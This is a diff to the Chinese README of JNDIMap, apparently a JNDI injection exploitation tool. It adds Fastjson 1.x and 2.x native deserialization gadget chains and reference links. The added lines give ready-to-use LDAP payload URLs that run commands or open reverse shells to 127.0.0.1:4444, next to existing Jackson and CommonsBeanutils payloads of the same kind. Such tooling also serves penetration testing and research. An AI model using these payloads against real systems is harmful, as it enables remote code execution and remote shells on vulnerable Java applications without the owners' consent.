@@ -320,6 +320,7 @@ JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化
 
 - CommonsCollections K1-K4
 - CommonsBeanutils (1.8.3 + 1.9.4)
+- Fastjson (1.2.x + 2.0.x)
 - Jackson
 
 ```bash
@@ -355,6 +356,16 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/444
 # 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
+
+# Fastjson 原生反序列化
+
+# Fastjson1: 全版本 (1.2.x)
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
+
+# Fastjson2: <= 2.0.26
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
 ```
 
 ### Custom
@@ -414,6 +425,10 @@ ldap://127.0.0.1:1389/x
 [https://xz.aliyun.com/t/12846](https://xz.aliyun.com/t/12846)
 
 [http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)
+
+[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson 与原生反序列化/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)
+
+[https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson 与原生反序列化-二/](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)
 
 [https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)
 
